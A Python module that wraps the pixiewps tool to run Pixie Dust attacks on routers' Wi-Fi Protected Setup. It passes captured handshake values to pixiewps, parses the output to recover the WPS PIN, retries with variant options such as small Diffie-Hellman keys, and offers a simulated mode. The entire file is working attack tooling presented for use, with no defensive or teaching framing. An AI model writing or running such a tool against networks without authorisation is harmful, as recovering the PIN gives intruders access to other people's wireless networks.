"""
Pixie Dust attack module with robust output parsing.
Author: Farhan

Handles Pixie Dust WPS attacks with comprehensive parsing of pixiewps output,
including E-Hash1/E-Hash2, Nonce, PKE/PKR extraction and fallback strategies.
"""

import re
import subprocess
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass


@dataclass
class PixieData:
    """Parsed Pixie Dust attack data."""
    
    e_hash1: Optional[str] = None
    e_hash2: Optional[str] = None
    e_nonce: Optional[str] = None
    pke: Optional[str] = None
    pkr: Optional[str] = None
    authkey: Optional[str] = None
    pin: Optional[str] = None
    success: bool = False
    error_message: Optional[str] = None


class PixieDustAttack:
    """Pixie Dust attack handler with robust parsing."""
    
    # Regex patterns for parsing pixiewps output
    PATTERNS = {
        'e_hash1': re.compile(r'E-Hash1:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'e_hash2': re.compile(r'E-Hash2:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'e_nonce': re.compile(r'E-Nonce:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'enrollee_nonce': re.compile(r'Enrollee Nonce:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'pke': re.compile(r'PKE:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'pkr': re.compile(r'PKR:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'authkey': re.compile(r'AuthKey:\s*([0-9a-fA-F]+)', re.IGNORECASE),
        'pin': re.compile(r'WPS pin:\s*(\d{8})', re.IGNORECASE),
        'pin_not_found': re.compile(r'WPS pin not found', re.IGNORECASE),
        'pixiewps_version': re.compile(r'Pixiewps\s+([\d.]+)', re.IGNORECASE),
    }
    
    def __init__(self, pixiewps_path: str = 'pixiewps', dry_run: bool = False) -> None:
        """
        Initialize Pixie Dust attack handler.
        
        Args:
            pixiewps_path: Path to pixiewps binary
            dry_run: Enable simulation mode
        """
        self.pixiewps_path = pixiewps_path
        self.dry_run = dry_run
        self.last_output: Optional[str] = None
    
    def parse_pixiewps_output(self, output: str) -> PixieData:
        """
        Parse pixiewps output to extract all relevant data.
        
        Args:
            output: Raw output from pixiewps
        
        Returns:
            PixieData object with parsed information
        """
        data = PixieData()
        
        # Extract all fields using regex patterns
        for field, pattern in self.PATTERNS.items():
            match = pattern.search(output)
            if match:
                # Handle patterns without capture groups
                if field == 'pin_not_found':
                    data.error_message = "WPS pin not found"
                    continue
                
                value = match.group(1)
                if field == 'pin':
                    data.pin = value
                    data.success = True
                elif field == 'e_nonce':
                    data.e_nonce = value
                elif field == 'enrollee_nonce' and not data.e_nonce:
                    data.e_nonce = value
                else:
                    setattr(data, field, value)
        
        # Check if we have enough data for potential offline attack
        if data.e_hash1 and data.e_hash2:
            data.success = data.success or bool(data.pin)
        
        return data
    
    def run_pixiewps(self, 
                     pke: str,
                     pkr: str,
                     e_hash1: str,
                     e_hash2: str,
                     authkey: Optional[str] = None,
                     e_nonce: Optional[str] = None,
                     extra_args: Optional[List[str]] = None) -> PixieData:
        """
        Execute pixiewps with provided parameters.
        
        Args:
            pke: Public Key Enrollee (hex)
            pkr: Public Key Registrar (hex)
            e_hash1: E-Hash1 value (hex)
            e_hash2: E-Hash2 value (hex)
            authkey: Optional AuthKey (hex)
            e_nonce: Optional E-Nonce (hex)
            extra_args: Additional command-line arguments
        
        Returns:
            PixieData object with results
        """
        if self.dry_run:
            return self._simulate_pixiewps()
        
        # Build command
        cmd = [
            self.pixiewps_path,
            '-e', pke,
            '-r', pkr,
            '-s', e_hash1,
            '-z', e_hash2,
        ]
        
        if authkey:
            cmd.extend(['-a', authkey])
        if e_nonce:
            cmd.extend(['-n', e_nonce])
        if extra_args:
            cmd.extend(extra_args)
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            self.last_output = result.stdout + result.stderr
            return self.parse_pixiewps_output(self.last_output)
            
        except subprocess.TimeoutExpired:
            data = PixieData()
            data.error_message = "Pixiewps execution timeout"
            return data
        except FileNotFoundError:
            data = PixieData()
            data.error_message = f"Pixiewps not found at {self.pixiewps_path}"
            return data
        except Exception as e:
            data = PixieData()
            data.error_message = f"Pixiewps execution error: {str(e)}"
            return data
    
    def _simulate_pixiewps(self) -> PixieData:
        """
        Simulate pixiewps execution for testing.
        
        Returns:
            Simulated PixieData
        """
        # Simulate successful attack for testing
        data = PixieData()
        data.e_hash1 = "aabbccdd11223344556677889900aabbccdd1122"
        data.e_hash2 = "11223344556677889900aabbccddeeef11223344"
        data.e_nonce = "99887766554433221100ffeeddccbbaa99887766"
        data.pke = "aabbccddeeff00112233445566778899aabbccddeeff"
        data.pkr = "112233445566778899aabbccddeeff00112233445566"
        data.pin = "12345670"
        data.success = True
        
        return data
    
    def try_pixie_variants(self,
                          pke: str,
                          pkr: str,
                          e_hash1: str,
                          e_hash2: str,
                          authkey: Optional[str] = None,
                          e_nonce: Optional[str] = None,
                          max_attempts: int = 3) -> Tuple[PixieData, int]:
        """
        Try multiple pixiewps variants with different parameters.
        
        Args:
            pke: Public Key Enrollee
            pkr: Public Key Registrar
            e_hash1: E-Hash1 value
            e_hash2: E-Hash2 value
            authkey: Optional AuthKey
            e_nonce: Optional E-Nonce
            max_attempts: Maximum number of variant attempts
        
        Returns:
            Tuple of (best PixieData result, attempts made)
        """
        attempts = 0
        best_result = PixieData()
        
        # Attempt 1: Standard attack
        attempts += 1
        result = self.run_pixiewps(pke, pkr, e_hash1, e_hash2, authkey, e_nonce)
        if result.success and result.pin:
            return result, attempts
        best_result = result
        
        if attempts >= max_attempts:
            return best_result, attempts
        
        # Attempt 2: Without authkey if we had one
        if authkey and attempts < max_attempts:
            attempts += 1
            result = self.run_pixiewps(pke, pkr, e_hash1, e_hash2, None, e_nonce)
            if result.success and result.pin:
                return result, attempts
        
        # Attempt 3: With different pixiewps options (e.g., -S for small DH keys)
        if attempts < max_attempts:
            attempts += 1
            result = self.run_pixiewps(
                pke, pkr, e_hash1, e_hash2, authkey, e_nonce,
                extra_args=['-S']
            )
            if result.success and result.pin:
                return result, attempts
        
        return best_result, attempts
    
    def validate_pixie_data(self, data: PixieData) -> Tuple[bool, List[str]]:
        """
        Validate that Pixie data has required fields.
        
        Args:
            data: PixieData to validate
        
        Returns:
            Tuple of (is_valid, list of missing fields)
        """
        required_fields = ['pke', 'pkr', 'e_hash1', 'e_hash2']
        missing = []
        
        for field in required_fields:
            if not getattr(data, field):
                missing.append(field)
        
        return len(missing) == 0, missing
    
    def format_output_for_compatibility(self, data: PixieData) -> List[str]:
        """
        Format output in backward-compatible format for automation scripts.
        
        Args:
            data: PixieData to format
        
        Returns:
            List of formatted output lines
        """
        lines = []
        
        lines.append("[i] Running Pixiewps...")
        
        if data.e_hash1:
            lines.append(f"E-Hash1: {data.e_hash1}")
        if data.e_hash2:
            lines.append(f"E-Hash2: {data.e_hash2}")
        
        if data.success and data.pin:
            lines.append(f"[+] WPS PIN: {data.pin}")
        else:
            lines.append("[-] WPS pin not found!")
        
        return lines
